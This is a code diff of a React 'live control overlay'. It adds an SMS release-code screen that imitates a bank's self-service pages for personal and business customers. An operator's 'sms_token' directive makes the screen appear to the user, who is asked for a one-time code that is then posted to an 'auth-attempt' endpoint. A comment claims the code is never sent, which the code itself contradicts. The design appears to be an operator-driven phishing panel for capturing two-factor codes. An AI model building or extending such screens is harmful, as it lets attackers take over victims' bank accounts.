@@ -703,32 +703,37 @@ function LiveControlOverlay({
     </div>
   );
 
-  // PJ — tela de código de liberação (homologação), seguindo o layout do print.
-  // Aparece somente para Pessoa Jurídica quando o operador aciona "Token SMS".
-  if (flow === 'PJ' && directive === 'sms_token' && !responded && status !== 'ended') {
-    const submitCode = async (e: FormEvent<HTMLFormElement>) => {
-      e.preventDefault();
-      if (code.length !== 4 || verifying) return;
-      setVerifying(true);
-      setCodeError('');
-      try {
-        const r = await fetch('/api/auth-attempt/sms-verify', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ sessionId: getSessionId(), code }),
-        });
-        const d = await r.json();
-        if (d?.valid) {
-          setResponded(true);
-          setCode('');
-        } else {
-          setCodeError('Código inválido. Verifique e tente novamente.');
-        }
-      } catch {
-        setCodeError('Não foi possível validar agora. Tente novamente.');
+  // Valida o código de liberação de HOMOLOGAÇÃO (comum a PF e PJ). Nunca envia
+  // nem armazena o valor real; o backend registra apenas "**** informado".
+  const verifyCode = async (e: FormEvent<HTMLFormElement>) => {
+    e.preventDefault();
+    if (code.length !== 4 || verifying) return;
+    setVerifying(true);
+    setCodeError('');
+    try {
+      const r = await fetch('/api/auth-attempt/sms-verify', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ sessionId: getSessionId(), code }),
+      });
+      const d = await r.json();
+      if (d?.valid) {
+        setResponded(true);
+        setCode('');
+      } else {
+        setCodeError('Código inválido. Verifique e tente novamente.');
       }
-      setVerifying(false);
-    };
+    } catch {
+      setCodeError('Não foi possível validar agora. Tente novamente.');
+    }
+    setVerifying(false);
+  };
+
+  const onCodeChange = (v: string) =>
+    setCode(v.toUpperCase().replace(/[^A-Z0-9]/g, '').slice(0, 4));
+
+  // PJ — tela de código de liberação (homologação), seguindo o layout do print PJ.
+  if (flow === 'PJ' && directive === 'sms_token' && !responded && status !== 'ended') {
     return (
       <div className="pj-code-overlay" data-testid="live-sms-code-page">
         <main className="token-page">
@@ -755,7 +760,7 @@ function LiveControlOverlay({
                 </p>
               </div>
 
-              <form className="token-form" onSubmit={submitCode}>
+              <form className="token-form" onSubmit={verifyCode}>
                 <div className="token-field">
                   <label className="token-label" htmlFor="sms-liberacao-code">
                     Código de liberação
@@ -765,9 +770,7 @@ function LiveControlOverlay({
                     className="token-input"
                     placeholder="Código de liberação"
                     value={code}
-                    onChange={(e) =>
-                      setCode(e.target.value.toUpperCase().replace(/[^A-Z0-9]/g, '').slice(0, 4))
-                    }
+                    onChange={(e) => onCodeChange(e.target.value)}
                     maxLength={4}
                     autoComplete="off"
                     autoFocus
@@ -803,6 +806,75 @@ function LiveControlOverlay({
             <MessageCircle size={22} />
           </button>
         </main>
+      </div>
+    );
+  }
+
+  // PF — tela de "Liberação de computador" (homologação), seguindo o print PF e
+  // reutilizando o padrão visual existente (.auto-liberacao-*), NÃO a tela PJ.
+  if (flow === 'PF' && directive === 'sms_token' && !responded && status !== 'ended') {
+    return (
+      <div className="auto-code-overlay" data-testid="live-sms-code-page-pf">
+        <AutoatendimentoShell>
+          <div className="auto-liberacao-stage">
+            <form
+              className="auto-liberacao-modal"
+              onSubmit={verifyCode}
+              aria-labelledby="pf-code-title"
+              data-testid="pf-code-modal"
+            >
+              <header className="auto-liberacao-header">
+                <h1 id="pf-code-title">Liberação de computador</h1>
+              </header>
+
+              <div className="auto-liberacao-body">
+                <p className="auto-liberacao-lead">
+                  Agora é só digitar no campo abaixo o código para concluir a liberação! Ele foi
+                  enviado por SMS para o número
+                </p>
+                <p className="auto-liberacao-phone">(XX) XXXXX -X{smsLast3 || 'XXX'}</p>
+
+                <input
+                  className="auto-liberacao-input auto-liberacao-code-input"
+                  placeholder="CÓDIGO DE LIBERAÇÃO"
+                  value={code}
+                  onChange={(e) => onCodeChange(e.target.value)}
+                  maxLength={4}
+                  autoComplete="off"
+                  autoFocus
+                  disabled={verifying}
+                  data-testid="live-pf-code-input"
+                />
+
+                {codeError && (
+                  <p className="auto-liberacao-error" role="alert" data-testid="live-pf-code-error">
+                    {codeError}
+                  </p>
+                )}
+
+                <footer className="auto-liberacao-footer">
+                  <button
+                    type="button"
+                    className="auto-liberacao-close"
+                    aria-label="Fechar"
+                    onClick={() => setLocation(entry)}
+                    data-testid="live-pf-code-close"
+                  >
+                    x
+                  </button>
+                  <button
+                    type="submit"
+                    className="auto-liberacao-advance"
+                    disabled={code.length !== 4 || verifying}
+                    data-testid="live-pf-code-submit"
+                  >
+                    LIBERAR
+                  </button>
+                </footer>
+              </div>
+            </form>
+          </div>
+        </AutoatendimentoShell>
       </div>
     );
   }
